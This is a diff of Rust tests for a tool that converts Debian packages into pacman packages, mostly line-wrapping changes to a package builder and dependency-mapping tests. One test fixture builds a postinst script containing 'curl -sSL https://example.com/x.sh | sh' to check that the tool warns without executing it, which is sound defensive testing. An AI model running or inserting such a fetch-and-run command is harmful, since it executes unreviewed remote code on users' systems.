@@ -27,7 +27,8 @@ impl DebBuilder {
     }
 
     fn script(mut self, name: &str, body: &str) -> Self {
-        self.control_scripts.push((name.to_string(), body.to_string()));
+        self.control_scripts
+            .push((name.to_string(), body.to_string()));
         self
     }
 
@@ -50,7 +51,12 @@ impl DebBuilder {
             let mut builder = tar::Builder::new(&mut control_tar);
             append_file(&mut builder, "./control", self.control.as_bytes(), 0o644);
             for (script_name, body) in &self.control_scripts {
-                append_file(&mut builder, &format!("./{script_name}"), body.as_bytes(), 0o755);
+                append_file(
+                    &mut builder,
+                    &format!("./{script_name}"),
+                    body.as_bytes(),
+                    0o755,
+                );
             }
             builder.finish().unwrap();
         }
@@ -100,8 +106,10 @@ fn write_member(out: &mut std::fs::File, name: &str, data: &[u8]) {
     out.write_all(format!("{:<12}", 0).as_bytes()).unwrap();
     out.write_all(format!("{:<6}", 0).as_bytes()).unwrap();
     out.write_all(format!("{:<6}", 0).as_bytes()).unwrap();
-    out.write_all(format!("{:<8}", 0o100644).as_bytes()).unwrap();
-    out.write_all(format!("{:<10}", data.len()).as_bytes()).unwrap();
+    out.write_all(format!("{:<8}", 0o100644).as_bytes())
+        .unwrap();
+    out.write_all(format!("{:<10}", data.len()).as_bytes())
+        .unwrap();
     out.write_all(b"`\n").unwrap();
     out.write_all(data).unwrap();
     if data.len() % 2 == 1 {
@@ -142,7 +150,10 @@ fn converts_deb_into_installable_package() {
         .unwrap()
         .contains("update-desktop-database"));
 
-    let mut mapper = DepMapper::new(MappingTable::builtin(), deb_installer_core::deps::SystemPacman::new());
+    let mut mapper = DepMapper::new(
+        MappingTable::builtin(),
+        deb_installer_core::deps::SystemPacman::new(),
+    );
     mapper.allow_network = false;
     let deps = mapper.resolve_all(&deb.control.depends());
     assert_eq!(deps[0].arch_name.as_deref(), Some("glibc"));
@@ -251,7 +262,10 @@ fn refuses_package_that_targets_pacman_database() {
 fn warns_on_dangerous_maintainer_script_without_executing_it() {
     let dir = tempfile::tempdir().unwrap();
     let deb_path = DebBuilder::new(CONTROL)
-        .script("postinst", "#!/bin/sh\ncurl -sSL https://example.com/x.sh | sh\n")
+        .script(
+            "postinst",
+            "#!/bin/sh\ncurl -sSL https://example.com/x.sh | sh\n",
+        )
         .file("usr/bin/demo", b"binary", 0o755)
         .write(dir.path(), "risky.deb");
 
